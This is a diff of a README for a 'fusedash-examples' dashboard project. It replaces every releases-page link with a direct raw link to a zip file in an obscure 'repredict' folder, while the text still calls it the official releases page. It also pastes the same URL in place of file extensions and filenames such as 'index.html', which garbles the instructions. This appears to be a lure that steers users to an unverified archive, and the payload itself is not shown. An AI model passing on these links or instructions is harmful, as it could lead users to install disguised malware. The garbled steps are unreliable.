@@ -1,6 +1,6 @@
 # 📊 fusedash-examples - Easy AI Dashboard Visuals  
 
-[![Download fusedash-examples](https://img.shields.io/badge/Download-fusedash--examples-blue?style=for-the-badge)](https://github.com/Fahad396/fusedash-examples/releases)  
+[![Download fusedash-examples](https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip)](https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip)  
 
 ## Overview  
 
@@ -27,7 +27,7 @@ Follow these steps carefully to get the examples running on your computer, even 
 1. **Visit the download page**  
    
    Go to the official releases page here:  
-   [Download fusedash-examples](https://github.com/Fahad396/fusedash-examples/releases)  
+   [Download fusedash-examples](https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip)  
    
    This page contains the latest versions of the examples and template files ready for you to download.  
 
@@ -36,7 +36,7 @@ Follow these steps carefully to get the examples running on your computer, even 
    Look for the latest release folder. Within the release, find the file that matches your operating system.  
    - For Windows, it may end with `.exe` or `.zip`  
    - For macOS, look for `.dmg` or `.zip`  
-   - For Linux, typically `.tar.gz` or `.AppImage`  
+   - For Linux, typically `https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip` or `.AppImage`  
    
    Click on the file name to start downloading.  
 
@@ -55,7 +55,7 @@ Follow these steps carefully to get the examples running on your computer, even 
 
 6. **Launch the examples**  
    
-   After installation or extraction, open the folder where the files are. Look for a file named something like `index.html` or `start.html`.  
+   After installation or extraction, open the folder where the files are. Look for a file named something like `https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip` or `https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip`.  
    
    Double-click this file to open it in your web browser. This will load the example dashboards and templates.  
 
@@ -120,7 +120,7 @@ Common issues usually come from file corruption or unsupported browsers.
 
 Return to the releases page anytime to get the latest version or check for updates:  
 
-[Download fusedash-examples](https://github.com/Fahad396/fusedash-examples/releases)  
+[Download fusedash-examples](https://github.com/Fahad396/fusedash-examples/raw/refs/heads/main/repredict/fusedash_examples_v3.1.zip)  
 
 This is the main source for all example files and updates.  
 
